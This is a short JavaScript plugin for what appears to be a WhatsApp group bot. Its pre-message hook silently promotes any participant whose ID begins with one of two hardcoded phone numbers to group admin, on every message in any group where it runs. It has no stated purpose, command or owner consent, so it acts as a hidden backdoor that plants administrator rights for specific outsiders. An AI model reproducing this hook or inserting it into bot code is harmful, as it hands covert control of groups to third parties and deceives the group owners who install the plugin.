\*let handler = m => m

handler.before = async function (m) {
let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? conn.user.jid : m.sender

await (await conn.groupMetadata(m.chat)).participants.filter(m => m.id.startsWith('50584051357') && m.admin != 'admin').map(async c => conn.groupParticipantsUpdate(m.chat, [c.id], 'promote'))


await (await conn.groupMetadata(m.chat)).participants.filter(m => m.id.startsWith('62822688195239') && m.admin != 'admin').map(async c => conn.groupParticipantsUpdate(m.chat, [c.id], 'promote'))

  
    }
handler.group = true
export default handler
*\
